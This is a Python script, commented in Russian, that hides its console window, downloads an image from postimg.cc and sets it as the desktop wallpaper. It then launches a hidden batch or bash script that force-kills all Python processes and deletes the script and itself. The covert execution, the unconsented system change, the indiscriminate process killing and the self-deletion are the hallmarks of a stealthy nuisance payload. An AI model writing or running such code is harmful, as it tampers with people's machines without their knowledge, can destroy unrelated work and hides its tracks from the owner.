import os
import sys
import urllib.request
import ctypes
import tempfile
import time
import subprocess


def main():
    # Скрываем окно
    if os.name == 'nt':
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass

    # Основная задача
    try:
        url = "https://i.postimg.cc/BQwqV6Pt/i-1.jpg"
        temp_img = os.path.join(tempfile.gettempdir(), f"temp_wallpaper_{os.getpid()}.jpg")

        urllib.request.urlretrieve(url, temp_img)

        if os.name == 'nt':
            ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_img, 3)
        else:
            os.system(f"gsettings set org.gnome.desktop.background picture-uri file://{temp_img}")

        time.sleep(1)

        # Удаляем временное изображение
        if os.path.exists(temp_img):
            os.remove(temp_img)

    except:
        pass

    # Самоудаление
    script_path = os.path.abspath(sys.argv[0])

    # Создаем скрипт для удаления
    if os.name == 'nt':
        bat_content = f"""
@echo off
ping -n 3 127.0.0.1 >nul
taskkill /f /im python.exe >nul 2>&1
taskkill /f /im pythonw.exe >nul 2>&1
del /f /q "{script_path}" >nul 2>&1
del /f /q "%0" >nul 2>&1
"""
        bat_file = os.path.join(tempfile.gettempdir(), f"self_destruct_{os.getpid()}.bat")
        with open(bat_file, "w") as f:
            f.write(bat_content)

        subprocess.Popen(['cmd', '/c', bat_file],
                         shell=False,
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL,
                         creationflags=subprocess.CREATE_NO_WINDOW)

    else:
        sh_content = f"""#!/bin/bash
sleep 3
pkill -f "{os.path.basename(script_path)}" 2>/dev/null
rm -f "{script_path}" 2>/dev/null
rm -f "$0" 2>/dev/null
"""
        sh_file = os.path.join(tempfile.gettempdir(), f"self_destruct_{os.getpid()}.sh")
        with open(sh_file, "w") as f:
            f.write(sh_content)
        os.chmod(sh_file, 0o755)
        subprocess.Popen(['/bin/bash', sh_file],
                         stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)


if __name__ == "__main__":
    main()